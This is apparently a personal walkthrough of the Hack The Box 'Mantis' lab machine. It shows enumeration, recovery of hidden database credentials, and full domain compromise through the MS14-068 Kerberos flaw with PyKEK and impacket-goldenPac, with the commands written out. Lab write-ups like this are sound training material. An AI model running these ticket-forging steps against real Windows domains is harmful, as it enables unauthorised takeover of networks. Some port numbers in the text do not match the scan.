
![logo](/logo.png)

# [Mantis- BOX]  
Hi folks, today I am going to solve an Hard rated hack the box machine which was released on 08 Sep 2017 machine on HTB,Mantis created by [lkys37en](https://app.hackthebox.com/users/709) .So without any further intro, let'sf jump in.

# common enumeration

## Nmap
  *kerberos
  *Goldenpac
  *ms14-068
  
###### code-nmap

```code
nmap -sV -sC -oA nmap/mantis 10.10.10.52
```

###### Output 

![](/Windows/Windows-Hard/Mantis/Screenshots/nmap.png)

```sh
 nmap -sV -sC -oA nmap/mantis 10.10.10.52                                                                                          ─╯
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 15:19 EAT
Nmap scan report for 10.10.10.52
Host is up (0.36s latency).
Not shown: 977 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
53/tcp    open     domain       Microsoft DNS 6.1.7601 (1DB15CD4) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15CD4)
88/tcp    open     kerberos-sec Microsoft Windows Kerberos (server time: 2024-09-07 12:20:25Z)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds Windows Server 2008 R2 Standard 7601 Service Pack 1 microsoft-ds (workgroup: HTB)
464/tcp   open     tcpwrapped
593/tcp   open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
1433/tcp  open     ms-sql-s     Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-09-07T12:21:46+00:00; +8s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-09-07T12:16:36
|_Not valid after:  2054-09-07T12:16:36
1494/tcp  filtered citrix-ica
2106/tcp  filtered ekshell
3268/tcp  open     ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
8080/tcp  open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Tossed Salad - Blog
|_http-server-header: Microsoft-IIS/7.5
49152/tcp open     msrpc        Microsoft Windows RPC
49153/tcp open     msrpc        Microsoft Windows RPC
49154/tcp open     msrpc        Microsoft Windows RPC
49155/tcp open     msrpc        Microsoft Windows RPC
49157/tcp open     msrpc        Microsoft Windows RPC
49158/tcp open     ncacn_http   Microsoft Windows RPC over HTTP 1.0
49161/tcp open     msrpc        Microsoft Windows RPC
49165/tcp open     msrpc        Microsoft Windows RPC
Service Info: Host: MANTIS; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2008 R2 Standard 7601 Service Pack 1 (Windows Server 2008 R2 Standard 6.1)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: mantis
|   NetBIOS computer name: MANTIS\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: mantis.htb.local
|_  System time: 2024-09-07T08:21:32-04:00
| smb2-time: 
|   date: 2024-09-07T12:21:29
|_  start_date: 2024-09-07T12:16:25
|_clock-skew: mean: 48m08s, deviation: 1h47m22s, median: 7s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 156.31 seconds
```

looking at the results  we find out that there are 20 ports open and its a `Windows`and its running 
`windows Server 2008 R2 Standard 6.1`

port[1337]-http IIS 7.5
port[1433]- ms-sql-s 

The scan also reveals a domain controller with the hosts `mantis.htb.local` as well as `htb.local` so lets fuzz port `1337` port to discover directories

```sh
gobuster dir -u http://10.10.10.52:1337 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k --no-error
```


Fuzzing the web server on port `1337` reveals a secure_notes directory, which contains a
`dev_notes_xxxx.txt.txt` file. The file reveals the database name used with SQL Server Express as `orcharddb`.

so lets download the file 

```sh
wget http://10.10.10.52:1377/secure_notes -r -np -nH -cut-dirs=1 -R "index.html*"
```

![](/Windows/Windows-Hard/Mantis/Screenshots/wget.png)

![](/Windows/Windows-Hard/Mantis/Screenshots/orchard.png)

There is a whitespace in between this and at the end their is a password so i remove the white spaces to only have the information arranged well.

![](/Windows/Windows-Hard/Mantis/Screenshots/deb_notes.png)

so lets convert the Binary to `ASCII`  with [cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDEwMDAwMDAwMTEwMDEwMDAxMTAxMTAxMDAxMDAwMDEwMTEwMTExMDAxMDExMTExMDEwMTAwMDAwMTAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTAxMDExMTAwMTEwMDAwMDExMTAwMTAwMTEwMDEwMDAwMTAwMDAx) 

![](/Windows/Windows-Hard/Mantis/Screenshots/cyberchef.png)

now that we have this piece of credentials lets log into the account using the Server SQL For SQL Server, the notes is about the file name, nad this one has some base64 inside of it, `dev_notes_NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx.txt.txt`. That decodes to a string of hex:

you can explore [Base64ToHex](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)From_Hex('Auto')&input=Tm1ReU5ESTBOekUyWXpWbU5UTTBNRFZtTlRBME1EY3pOek0xTnpNd056STJOREl4&oeol=CR)

```sh
echo NmQyNDI0NzE2YzVmNTM0MDVmNTA0MDczNzM1NzMwNzI2NDIx | base64 -d | xxd -r -p
```

![](/Windows/Windows-Hard/Mantis/Screenshots/base64.png)

```sh
impacket-mssqlclient 'htb.local/admin:m$$ql_S@_P@ssW0rd!@10.10.10.52'
```

we can now acces [Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`)

![](/Windows/Windows-Hard/Mantis/Screenshots/mssql.png)

```shell-session
select name from sys.databases
SELECT * FROM orcharddb.INFORMATION_SCHEMA.TABLES
USE orcharddb
```

from this we see something tough it on  in a correct format 

![](/Windows/Windows-Hard/Mantis/Screenshots/mssqlcommands.png)

Another method  the database was large, and I decided to switch to a GUI, `dbeaver`. On starting it, there’s a pop-up to connect to a database:

![](/Windows/Windows-Hard/Mantis/Screenshots/dbever.png)


![](/Windows/Windows-Hard/Mantis/Screenshots/connection.png)

lets do a validation of credential using crackmapexec 

```sh
crackmapexec smb 10.10.10.52 -u james -p 'J@m3s_P@ssW0rd!'
```

![](/Windows/Windows-Hard/Mantis/Screenshots/crackmapexec.png)

##### Identify Exploit

After striking out on more exploitation, I started to Google a bit, and eventually found [this blog post](https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html) about MS14-068. Basically it’s a critical vulnerability in Windows DCs that allow a simple user to get a Golden ticket without being an admin. With that ticket, I am basically a domain admin

Following along with the article, I’ll install the Kerberos packages:

```sh
sudo apt-get install krb5-user cifs-utils
```

I’ll add the domain controller to my `/etc/hosts` file using the name identified by `nmap` at the start:

```sh
10.10.10.52 mantis.htb.local mantis
```

and add Mantis as a DNS server in `/etc/resolv.conf`:

```sh
nameserver 10.10.10.52
```

`/etc/krb5.conf` needs to have information about the domain. Based on the blog, I’ll set mine to:

```sh
[libdefaults]
    default_realm = HTB.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = true

[realms]
    HTB.LOCAL = {
        kdc = mantis.htb.local
        admin_server = mantis.htb.local
    }

[domain_realm]
    .htb.local = HTB.LOCAL
    htb.local = HTB.LOCAL

```

Check DNS Resolution:

```sh
nslookup mantis.htb.local
```

![](/Windows/Windows-Hard/Mantis/Screenshots/nslookup.png)

Verify that the KDC is reachable on port 88 (Kerberos)

```sh
nc -zv mantis.htb.local 88
```

![](/Windows/Windows-Hard/Mantis/Screenshots/kebros.png)


I’ll use `ntpdate 10.10.10.52` to sync my host’s time to Mantis, as Kerberos requires the two clocks be in sync.

##### Generate Kerberos Ticket

First I’ll test this config and try to generate a Kerberos ticket in need some sudo privillages

```sh
sudo kinit james
```

![](/Windows/Windows-Hard/Mantis/Screenshots/knit.png)

`klist` will show the ticket:

![](/Windows/Windows-Hard/Mantis/Screenshots/klist.png)

james can connect to RPC

###### Forge Golden Ticket

First I need the SID for the james user. I’ll get it via `rpcclient`

```sh
rpcclient -U htb.local/james 10.10.10.52
```

lookupname will reveal the SID

```sh
lookupnames james
```

![](/Windows/Windows-Hard/Mantis/Screenshots/lookupname.png)

Once the SID has been obtained, it is possible to run PyKEK to generate a Kerberos ticket by
running the command i was able to find a copy of `ms14-068.py` [here-PyKEK](https://github.com/mubix/pykek), and I’ll run it just like the help suggests:

```sh
python2 ms14-068.py -u james@htb.local -s S-1-5-21-4220043660-4019079961-2895681657-1103 -d mantis.htb.local
```


```sh
 cp TGT_james@htb.local.ccache /tmp/krb5cc_0
```

```
smbclient -W htb.local //mantis/c$ -k
```

and now dir and get flags from `get Users\james\desktop\user.txt` and `get Users\administrator\desktop\root.txt`

### OR

The [MS14-068](https://www.trustedsec.com/blog/ms14-068-full-compromise-step-step/) exploit targets Kerberos and can be used to forge Kerberos tickets using domain user permissions. Lucky for us, [impacket-goldenPac](https://github.com/SecureAuthCorp/impacket/blob/master/examples/goldenPac.py) can be used to automatically exploit the vulnerability.Impacket has a script

```sh
impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis'
```

![](/Windows/Windows-Hard/Mantis/Screenshots/goldenpac.png)

then you can get the user flag and root flag 

![](/Windows/Windows-Hard/Mantis/Screenshots/flags.png)

	-------------------------END successful attack @lesley----------------------


